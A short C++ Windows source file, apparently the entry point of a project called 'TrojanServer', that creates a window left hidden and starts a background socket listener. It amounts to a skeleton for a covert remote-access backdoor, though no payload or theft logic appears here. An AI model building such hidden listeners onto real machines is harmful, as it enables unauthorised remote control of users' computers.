
#ifndef UNICODE
#define UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <iostream>
#include <Windows.h>
#include <WinSock2.h>
#include <iphlpapi.h>
#include "TrojanServer.hh"
#include "WinapiHelpers.hh"
#include "ServerWindow.h"
#include "ServerConfig.hh"
#include "SocketListener.h"
#include <future>
#include "Console.hh"

#pragma comment(lib, "Ws2_32.lib")

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR lpCmdLine, int nCmdShow) {
#ifdef _DEBUG
	Console::CreateConsole();
#endif // _DEBUG
	auto mainWindow = ServerWindow();
	if (!mainWindow.Create(ServerConfig::WND_TITLE, WS_OVERLAPPEDWINDOW)) {
		std::cerr << Winapi::GetErrorMessage() << std::endl;
		return 0;
	}
	//mainWindow.Show(nCmdShow);
	auto socketListenerThread = std::thread([&]() {
		SocketListener socketListener = SocketListener(&mainWindow);
		socketListener.BlockingListen();
	});
	
	// message loop
	MSG msg = {};
	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	//socketListenerThread.join();
	return 0;
}
